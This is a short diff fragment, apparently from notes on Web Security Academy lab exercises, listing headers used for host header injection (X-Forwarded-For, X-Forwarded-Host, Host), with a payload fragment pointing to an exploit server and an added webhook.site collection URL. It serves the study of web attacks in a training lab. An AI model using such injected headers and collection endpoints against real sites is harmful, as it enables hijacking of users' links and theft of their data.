@@ -15,3 +15,6 @@ Host: your-lab-id.web-security-academy.net:'<a href="//your-exploit-server-id.we
 X-Forwarded-For
 X-Forwarded-Host
 Host:
+
+
+https://webhook.site/
